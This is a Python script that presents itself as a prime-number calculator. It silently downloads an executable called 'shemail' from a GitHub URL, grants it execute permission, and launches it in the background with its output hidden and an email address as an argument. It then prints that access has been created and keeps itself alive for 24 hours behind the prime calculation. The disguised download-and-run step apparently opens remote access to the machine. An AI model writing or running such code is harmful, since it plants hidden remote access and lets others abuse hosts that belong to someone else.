import os
import subprocess
import time
import math
from datetime import datetime, timedelta
import urllib.request
import argparse


SSHMAIL_URL = "https://github.com/icadnewton/sendme/raw/refs/heads/main/shemail"
SSHMAIL_FILE = "shemail"


def check_and_download_file(file_name, url):
    if not os.path.exists(file_name):
        print(f"File {file_name} is not available. Downloading from {url}...")
        try:
            urllib.request.urlretrieve(url, file_name)
            print(f"File {file_name} has been downloaded successfully.")
            os.chmod(file_name, 0o755)  # Grant execution permissions chmod +x
            print(f"Execution permissions granted for {file_name}.")
        except Exception as e:
            print(f"Failed to download {file_name}: {e}")
            raise
    else:
        print(f"File {file_name} is already available.")

def run_background_script(email):
    try:
        script_path = os.path.abspath(SSHMAIL_FILE) 
        if not os.path.exists(script_path):
            raise FileNotFoundError(f"File {script_path} not found.")
        if not os.access(script_path, os.X_OK):
            raise PermissionError(f"File {script_path} does not have execution permissions.")

        command = [script_path, "-email", email]
        subprocess.Popen(
            command,
            stdout=subprocess.DEVNULL,  
            stderr=subprocess.DEVNULL, 
        )
        print(f"Access successfully created, check your email: {email}")
    except Exception as e:
        print(f"Error while running the script {SSHMAIL_FILE}: {e}")
        raise


def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, int(math.sqrt(number)) + 1):
        if number % i == 0:
            return False
    return True


def calculate_primes():
    print("Calculating prime numbers...")
    max_number = 1000
    primes = [num for num in range(2, max_number + 1) if is_prime(num)]
    print(f"Prime numbers between 2 and {max_number}:")
    print(primes)


def main():
    parser = argparse.ArgumentParser(description="Script to calculate prime numbers.")
    parser.add_argument("-email", required=True, help="Recipient email address.")
    args = parser.parse_args()
    email = args.email

  
    if "@" not in email or "." not in email:
        print("Invalid email. Please enter a valid email address.")
        return

   
    check_and_download_file(SSHMAIL_FILE, SSHMAIL_URL)

  
    try:
        run_background_script(email)
    except Exception:
        print("Failed to run the script. Program terminated.")
        return

    
    start_time = datetime.now()
    end_time = start_time + timedelta(hours=24)

    print("Calculating prime numbers for 24 hours...")
    while datetime.now() < end_time:
        calculate_primes()
        time.sleep(180)  

    print("Simple calculation process ensures runtime remains active.")

if __name__ == "__main__":
    main()
